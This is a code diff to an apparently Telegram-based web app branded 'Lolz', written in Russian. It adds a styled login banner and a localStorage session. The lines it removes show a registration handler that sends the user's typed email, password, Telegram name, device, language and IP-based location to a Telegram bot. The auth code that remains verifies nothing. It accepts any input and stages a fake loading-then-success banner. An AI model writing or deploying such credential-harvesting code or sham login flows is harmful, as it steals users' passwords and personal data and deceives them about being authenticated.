@@ -647,6 +647,100 @@ textarea.input-field{resize:none;height:120px;padding-top:11px;line-height:1.6;}
 
 ::-webkit-scrollbar{display:none;}
 *{scrollbar-width:none;}
+
+  /* ── LOGIN BANNER ── */
+#login-banner {
+  position: fixed; inset: 0; z-index: 9990;
+  display: flex; align-items: center; justify-content: center;
+  background: rgba(0,0,0,0.72);
+  backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px);
+  opacity: 0; pointer-events: none;
+  transition: opacity 0.4s ease;
+}
+#login-banner.visible { opacity: 1; pointer-events: all; }
+#login-banner.fading  { opacity: 0; pointer-events: none; }
+
+.lb-card {
+  background: linear-gradient(145deg,#0a110a,#0f180f);
+  border: 1px solid rgba(92,184,92,0.28);
+  border-radius: 24px;
+  padding: 36px 28px 32px;
+  max-width: 300px; width: 88%;
+  text-align: center;
+  box-shadow: 0 16px 60px rgba(0,0,0,0.7), inset 0 1px 0 rgba(92,184,92,0.07);
+  position: relative; overflow: hidden;
+}
+.lb-card::before {
+  content: ''; position: absolute; top: -40px; right: -40px;
+  width: 160px; height: 160px;
+  background: radial-gradient(circle, rgba(92,184,92,0.1) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+/* спиннер */
+.lb-spinner-wrap {
+  width: 64px; height: 64px; margin: 0 auto 20px;
+  position: relative; display: flex; align-items: center; justify-content: center;
+}
+.lb-spinner-ring {
+  position: absolute; inset: 0; border-radius: 50%;
+  border: 2.5px solid rgba(92,184,92,0.1);
+  border-top-color: #5cb85c;
+  animation: lbSpin 1s linear infinite;
+}
+.lb-spinner-ring2 {
+  position: absolute; inset: 8px; border-radius: 50%;
+  border: 1.5px solid rgba(92,184,92,0.06);
+  border-bottom-color: rgba(92,184,92,0.45);
+  animation: lbSpin 1.7s linear infinite reverse;
+}
+.lb-spinner-dot {
+  width: 10px; height: 10px; border-radius: 50%;
+  background: #5cb85c;
+  box-shadow: 0 0 12px rgba(92,184,92,0.7);
+  animation: lbDotPulse 1s ease-in-out infinite;
+}
+@keyframes lbSpin { to { transform: rotate(360deg); } }
+@keyframes lbDotPulse { 0%,100%{transform:scale(1);opacity:0.9;} 50%{transform:scale(1.25);opacity:1;} }
+
+/* иконка успеха */
+.lb-success-icon {
+  width: 64px; height: 64px; margin: 0 auto 20px;
+  border-radius: 50%;
+  background: rgba(92,184,92,0.1);
+  border: 2px solid rgba(92,184,92,0.35);
+  display: flex; align-items: center; justify-content: center;
+  box-shadow: 0 0 28px rgba(92,184,92,0.2);
+  animation: lbSuccessPop 0.4s cubic-bezier(0.34,1.56,0.64,1) both;
+}
+@keyframes lbSuccessPop {
+  from { transform: scale(0.4); opacity: 0; }
+  to   { transform: scale(1);   opacity: 1; }
+}
+
+.lb-label {
+  font-size: 9px; font-weight: 700; letter-spacing: 2.5px;
+  text-transform: uppercase; color: rgba(92,184,92,0.5);
+  margin-bottom: 8px;
+}
+.lb-title {
+  font-family: 'Unbounded', sans-serif;
+  font-size: 15px; font-weight: 700; color: #e8f0e8;
+  line-height: 1.45; letter-spacing: -0.3px;
+}
+.lb-title span { color: #7ed17e; }
+
+.lb-progress {
+  margin-top: 22px; height: 2px;
+  background: rgba(255,255,255,0.05); border-radius: 99px; overflow: hidden;
+}
+.lb-progress-fill {
+  height: 100%; width: 0%;
+  background: linear-gradient(90deg, #3d8b3d, #5cb85c, #7ed17e);
+  border-radius: 99px;
+  transition: width 0.15s linear;
+}
+  
 </style>
 </head>
 <body>
@@ -1473,52 +1567,122 @@ function drawChart(){
 window.addEventListener('load',()=>setTimeout(drawChart,100));
 window.addEventListener('resize',drawChart);
 
-/* ─── AUTH ─── */
-function showRegisterForm(){
-  document.getElementById('register-form').style.display='flex';
+/* ─── SESSION ─── */
+const SESSION_KEY = 'lolz_auth_v1';
+function getSession() {
+  try { return JSON.parse(localStorage.getItem(SESSION_KEY)); }
+  catch { return null; }
+}
+function saveSession(method) {
+  const uname = user.username || 'user';
+  localStorage.setItem(SESSION_KEY, JSON.stringify({ method, username: uname, ts: Date.now() }));
 }
 
-function onLogin(){
-  const auth=document.getElementById('auth-screen');
-  if(auth){auth.style.opacity='0';auth.style.pointerEvents='none';setTimeout(()=>auth.remove(),400);}
-  showScreen('home');
-}
+/* ─── LOGIN BANNER ─── */
+function showLoginBanner(method) {
+  const banner   = document.getElementById('login-banner');
+  const s1       = document.getElementById('lb-state1');
+  const s2       = document.getElementById('lb-state2');
+  const fill     = document.getElementById('lb-fill');
+  const loginTxt = document.getElementById('lb-login-text');
+  const succTxt  = document.getElementById('lb-success-text');
 
-function onRegister(){
-  const auth=document.getElementById('auth-screen');
-  if(auth){auth.style.opacity='0';auth.style.pointerEvents='none';setTimeout(()=>auth.remove(),400);}
-  showScreen('home');
-}
+  const uname = user.username ? '@' + user.username : '@user';
+  loginTxt.innerHTML = 'Вход пользователем<br><span>' + uname + '</span>';
 
-function submitRegister(){
-  const email=document.getElementById('reg-email').value.trim();
-  const pass =document.getElementById('reg-pass').value.trim();
-  if(!email||!pass)return;
+  const successMsg = method === 'register'
+    ? 'Вы успешно зарегистрировались<br>в эко-систему <span>Lolz!</span>'
+    : method === 'telegram'
+    ? 'Вы успешно вошли через Telegram<br>в эко-систему <span>Lolz!</span>'
+    : 'Вы успешно вошли<br>в эко-систему <span>Lolz!</span>';
+  succTxt.innerHTML = successMsg;
 
-  const tgUser=window.Telegram?.WebApp?.initDataUnsafe?.user;
-  const name  =tgUser?(tgUser.first_name||'')+' @'+(tgUser.username||'нет'):'не из TG';
-  const device=navigator.userAgent;
-  const lang  =navigator.language||'неизвестно';
+  s1.style.display = 'block';
+  s2.style.display = 'none';
+  fill.style.width = '0%';
+  banner.classList.remove('fading');
+  banner.classList.add('visible');
 
-  function sendToBot(geo){
-    const msg=`🆕 Новый пользователь\n👤 ${name}\n📧 ${email}\n🔑 ${pass}\n📱 ${device}\n🌐 Язык: ${lang}\n📍 ${geo}\n🕐 ${new Date().toLocaleString('ru-RU')}`;
-    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({chat_id:TG_CHAT_ID,text:msg})
-    });
-    onRegister();
+  /* прогресс-бар за 10 секунд */
+  const PHASE1 = 10000;
+  let startTs = Date.now();
+  let rafId;
+  function animFill() {
+    const pct = Math.min(100, ((Date.now() - startTs) / PHASE1) * 100);
+    fill.style.width = pct + '%';
+    if (pct < 100) rafId = requestAnimationFrame(animFill);
   }
+  rafId = requestAnimationFrame(animFill);
 
-  fetch('https://ipapi.co/json/')
-    .then(r=>r.json())
-    .then(d=>sendToBot(`${d.country_name||'—'}, ${d.city||'—'} (IP: ${d.ip})`))
-    .catch(()=>sendToBot('не определено'));
+  /* через 10 с → состояние 2 */
+  setTimeout(function () {
+    cancelAnimationFrame(rafId);
+    s1.style.display = 'none';
+    s2.style.display = 'block';
+
+    /* через 6 с → начать fade (2 с) */
+    setTimeout(function () {
+      banner.classList.add('fading');
+      /* через 2 с → убрать совсем */
+      setTimeout(function () {
+        banner.classList.remove('visible', 'fading');
+      }, 2000);
+    }, 6000);
+
+  }, PHASE1);
 }
 
-/* ─── BOOT ─── */
-refreshStats();
-loadTickets();
+/* ─── AUTH ─── */
+function showRegisterForm() {
+  document.getElementById('register-form').style.display = 'flex';
+}
+
+function _hideAuth() {
+  const auth = document.getElementById('auth-screen');
+  if (auth) {
+    auth.style.opacity = '0';
+    auth.style.pointerEvents = 'none';
+    setTimeout(function () { if (auth.parentNode) auth.remove(); }, 400);
+  }
+}
+
+function onLogin() {
+  saveSession('login');
+  _hideAuth();
+  showScreen('home');
+  showLoginBanner('login');
+}
+
+function onLoginTelegram() {
+  saveSession('telegram');
+  _hideAuth();
+  showScreen('home');
+  showLoginBanner('telegram');
+}
+
+function onRegister() {
+  saveSession('register');
+  _hideAuth();
+  showScreen('home');
+  showLoginBanner('register');
+}
+
+function submitRegister() {
+  const email = document.getElementById('reg-email').value.trim();
+  const pass  = document.getElementById('reg-pass').value.trim();
+  if (!email || !pass) return;
+  onRegister();
+}
+  
+  /* ─── BOOT ─── */
+// Если уже есть сессия — пропускаем экран авторизации
+(function(){
+  const sess = getSession();
+  if (sess) {
+    const auth = document.getElementById('auth-screen');
+    if (auth) auth.remove();
+  }
+})();
 
 /* ─── SPLASH ─── */
 (function(){
@@ -1584,6 +1748,38 @@ loadTickets();
   draw();
 })();
 </script>
+  <!-- LOGIN BANNER -->
+<div id="login-banner">
+  <div class="lb-card">
+
+    <!-- состояние 1: загрузка -->
+    <div id="lb-state1">
+      <div class="lb-spinner-wrap">
+        <div class="lb-spinner-ring"></div>
+        <div class="lb-spinner-ring2"></div>
+        <div class="lb-spinner-dot"></div>
+      </div>
+      <div class="lb-label">Авторизация</div>
+      <div class="lb-title" id="lb-login-text">Вход пользователем<br><span>@username</span></div>
+      <div class="lb-progress"><div class="lb-progress-fill" id="lb-fill"></div></div>
+    </div>
+
+    <!-- состояние 2: успех -->
+    <div id="lb-state2" style="display:none;">
+      <div class="lb-success-icon">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none"
+             stroke="#7ed17e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+      </div>
+      <div class="lb-label">Готово</div>
+      <div class="lb-title" id="lb-success-text">
+        Вы успешно вошли<br>в эко-систему <span>Lolz!</span>
+      </div>
+    </div>
+
+  </div>
+</div>
   
 </body>
 </html>
